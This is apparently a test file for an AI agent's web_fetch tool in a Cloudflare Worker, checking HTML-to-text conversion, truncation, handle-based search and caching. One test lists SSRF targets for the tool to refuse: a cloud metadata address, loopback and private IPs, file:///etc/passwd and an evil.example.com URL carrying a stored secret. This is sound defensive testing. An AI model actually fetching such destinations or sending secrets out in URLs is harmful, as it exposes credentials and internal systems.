import { env } from "cloudflare:workers";
import { SELF, reset, runInDurableObject, abortAllDurableObjects } from "cloudflare:test";
import { afterEach, beforeEach, expect, it, vi } from "vite-plus/test";
import * as Option from "effect/Option";
import * as Schema from "effect/Schema";
import { WebPages } from "../src/web-fetch";
import { headers, signIn } from "./session";

const token = `sk-ant-oat01-${"w".repeat(64)}`;

type ClaudeRequest = { tools?: { name: string }[]; messages: unknown[] };

/** A Claude SSE response with one text block or one tool_use block. */
function claude(block: { text: string } | { tool: string; input: object; id: string }) {
  const content =
    "text" in block
      ? [
          { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } },
          {
            type: "content_block_delta",
            index: 0,
            delta: { type: "text_delta", text: block.text },
          },
        ]
      : [
          {
            type: "content_block_start",
            index: 0,
            content_block: { type: "tool_use", id: block.id, name: block.tool, input: {} },
          },
          {
            type: "content_block_delta",
            index: 0,
            delta: { type: "input_json_delta", partial_json: JSON.stringify(block.input) },
          },
        ];

  const events = [
    {
      type: "message_start",
      message: {
        id: `msg_${crypto.randomUUID()}`,
        type: "message",
        role: "assistant",
        model: "claude-sonnet-5-5",
        content: [],
        stop_reason: null,
        stop_sequence: null,
        usage: { input_tokens: 10, output_tokens: 0 },
      },
    },
    ...content,
    { type: "content_block_stop", index: 0 },
    {
      type: "message_delta",
      delta: { stop_reason: "text" in block ? "end_turn" : "tool_use", stop_sequence: null },
      usage: { output_tokens: 1 },
    },
    { type: "message_stop" },
  ];

  return new Response(
    events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""),
    { headers: { "content-type": "text/event-stream" } },
  );
}

const ToolResult = Schema.Struct({ type: Schema.Literal("tool_result"), content: Schema.String });
const Message = Schema.Struct({ content: Schema.Array(Schema.Unknown) });

/** The text of the last tool_result the model was sent. */
function lastToolResult(request: ClaudeRequest): string {
  const texts: string[] = [];

  for (const message of request.messages) {
    const blocks = Option.getOrUndefined(Schema.decodeUnknownOption(Message)(message))?.content;

    for (const block of blocks ?? []) {
      const result = Schema.decodeUnknownOption(ToolResult)(block);

      if (Option.isSome(result)) texts.push(result.value.content);
    }
  }

  return texts.at(-1) ?? "";
}

const article = `<!doctype html><html><head><title>AI code review &amp; you</title>
<style>body{}</style><script>track()</script></head><body>
<nav><a href="/">Home</a> <a href="/blog">Blog</a></nav>
<article><h1>How we review code with AI</h1>
<p>Reviews run on every pull request. See <a href="/docs/setup">the setup guide</a>.</p>
${Array.from({ length: 400 }, (_, i) => `<p>Filler paragraph ${i} about nothing in particular.</p>`).join("\n")}
<p>The <b>reviewer budget</b> is capped at 50 comments per PR.</p>
</article><footer>Copyright</footer></body></html>`;

beforeEach(async () => {
  await reset();
  await signIn();
  await runInDurableObject(env.AGENT.getByName("owner"), async (_, state) => {
    await state.storage.delete("credential:anthropic");
    await state.storage.delete("credential:openai");
  });
});

afterEach(async () => {
  await abortAllDurableObjects();
  vi.restoreAllMocks();
});

it("lets a session fetch a page as bounded text and search the rest by handle", async () => {
  const toolTurns: ClaudeRequest[] = [];
  const siteRequests: Request[] = [];
  let turns = 0;
  let handle = "";
  let offered: string[] = [];

  vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
    const request = new Request(input, init);

    if (request.url === "https://blog.example.com/ai-code-review") {
      siteRequests.push(request);

      return new Response(null, {
        status: 301,
        headers: { location: "/ai-code-review/" },
      });
    }

    if (request.url === "https://blog.example.com/ai-code-review/") {
      siteRequests.push(request);

      return new Response(article, { headers: { "content-type": "text/html; charset=utf-8" } });
    }

    if (!request.url.includes("/v1/messages")) return new Response("{}");
    const body = await request.json<ClaudeRequest>();

    // Saving the token probes Claude, and the session is titled, without tools.
    if (!body.tools?.length && !JSON.stringify(body.messages).includes("tool_result"))
      return claude({ text: "Title" });
    turns++;

    if (turns === 1) {
      offered = body.tools?.map((tool) => tool.name) ?? [];

      return claude({
        tool: "web_fetch",
        id: "toolu_fetch",
        input: { url: "https://blog.example.com/ai-code-review" },
      });
    }

    toolTurns.push(body);

    if (turns === 2) {
      handle = /handle: (web_[0-9a-f]+)/.exec(lastToolResult(body))?.[1] ?? "";

      return claude({
        tool: "web_fetch",
        id: "toolu_read",
        input: { handle, find: "reviewer budget", context: 40 },
      });
    }

    return claude({ text: "Read it" });
  });

  expect(
    (
      await SELF.fetch("https://worker/api/auth/anthropic", {
        method: "PUT",
        headers,
        body: JSON.stringify({ token }),
      })
    ).status,
  ).toBe(200);

  const created = await SELF.fetch("https://worker/api/sessions", {
    method: "POST",
    headers,
    body: JSON.stringify({ model: "claude-sonnet-5-5" }),
  });

  const { id } = await created.json<{ id: string }>();

  const sent = await SELF.fetch(`https://worker/api/sessions/${id}/messages`, {
    method: "POST",
    headers,
    body: JSON.stringify({ content: "Read the blog post", requestId: crypto.randomUUID() }),
  });

  expect(sent.status).toBe(202);
  await expect.poll(() => toolTurns.length, { timeout: 15_000 }).toBe(2);

  // The tool is offered to the model.
  expect(offered).toContain("web_fetch");

  const fetched = lastToolResult(toolTurns[0]!);
  expect(fetched).toContain("title: AI code review & you");
  expect(fetched).toContain("redirected to: https://blog.example.com/ai-code-review/");
  expect(fetched).toContain("# How we review code with AI");
  expect(fetched).toContain("[the setup guide](https://blog.example.com/docs/setup)");
  // Chrome, scripts and styles are dropped; only the head of the long page is inline.
  expect(fetched).not.toContain("track()");
  expect(fetched).not.toContain("Copyright");
  expect(fetched).not.toContain("Home");
  expect(fetched).not.toContain("reviewer budget");
  expect(fetched).toMatch(/\[showing the first 4,000 of [\d,]+ chars/);
  expect(handle).toMatch(/^web_[0-9a-f]{16}$/);

  const found = lastToolResult(toolTurns[1]!);
  expect(found).toContain("1 match in");
  expect(found).toContain("The reviewer budget is capped at 50 comments per PR.");

  // Searching by handle served the stored copy: the site saw one fetch plus its redirect.
  expect(siteRequests.map((request) => request.url)).toEqual([
    "https://blog.example.com/ai-code-review",
    "https://blog.example.com/ai-code-review/",
  ]);

  // No cookies or credentials leave the Worker.

  for (const request of siteRequests) {
    expect(request.headers.get("cookie")).toBeNull();
    expect(request.headers.get("authorization")).toBeNull();
  }
}, 30_000);

it("refuses private destinations on every hop, stored secrets in URLs and binary bodies", async () => {
  const dialled: string[] = [];

  vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
    const request = new Request(input, init);
    dialled.push(request.url);

    if (request.url === "https://public.example.com/hop")
      return new Response(null, { status: 302, headers: { location: "http://169.254.169.254/" } });

    if (request.url === "https://public.example.com/mapped")
      return new Response(null, {
        status: 302,
        headers: { location: "http://[::ffff:10.0.0.1]/" },
      });

    if (request.url === "https://public.example.com/image.png")
      return new Response(new Uint8Array([137, 80, 78, 71]), {
        headers: { "content-type": "image/png" },
      });

    return new Response("unexpected", { status: 500 });
  });

  await runInDurableObject(env.AGENT.getByName("owner"), async (_, state) => {
    const pages = new WebPages(state.storage.sql);
    const fetch = (url: string, secrets: string[] = []) => pages.fetch("c1", url, {}, secrets);

    for (const url of [
      "http://127.0.0.1/",
      "http://2130706433/",
      "http://10.1.2.3/",
      "http://[::1]/",
      "http://[fd00::1]/",
      "http://localhost:8787/",
      "http://browser.workspace/json/version",
      "http://metadata/",
      "file:///etc/passwd",
      "https://user:pass@example.com/",
    ])
      await expect(fetch(url)).rejects.toThrow(/Refusing|Only http|credentials/);

    await expect(fetch("https://public.example.com/hop")).rejects.toThrow(
      "Refusing to fetch the private address 169.254.169.254",
    );
    await expect(fetch("https://public.example.com/mapped")).rejects.toThrow("private address");
    await expect(
      fetch("https://evil.example.com/?q=supersecret-token-value", ["supersecret-token-value"]),
    ).rejects.toThrow("stored credential");
    await expect(fetch("https://public.example.com/image.png")).rejects.toThrow("is not text");
  });

  // Only the public first hops were dialled; no private address or secret-bearing URL was.
  expect(dialled).toEqual([
    "https://public.example.com/hop",
    "https://public.example.com/mapped",
    "https://public.example.com/image.png",
  ]);
});

it("keeps pages per conversation for an hour and reads them by offset", async () => {
  vi.spyOn(globalThis, "fetch").mockImplementation(
    async () =>
      new Response("a".repeat(5_000) + "TAIL", { headers: { "content-type": "text/plain" } }),
  );

  await runInDurableObject(env.AGENT.getByName("owner"), async (_, state) => {
    let now = 1_000_000;
    const pages = new WebPages(state.storage.sql, () => now);
    const page = await pages.fetch("c1", "https://example.com/notes.txt", { headChars: 1000 }, []);

    expect(page).toMatchObject({ chars: 5004, truncated: true, cached: false });
    expect(page.head).toHaveLength(1000);
    expect(pages.read("c1", page.handle, { offset: 5000 })).toMatchObject({
      text: "TAIL",
      truncated: false,
    });
    // Another conversation cannot read this one's page.
    expect(() => pages.read("c2", page.handle, {})).toThrow("No fetched page");
    expect((await pages.fetch("c1", "https://example.com/notes.txt", {}, [])).cached).toBe(true);

    now += 60 * 60 * 1000 + 1;
    expect(() => pages.read("c1", page.handle, {})).toThrow("expired");
  });
});
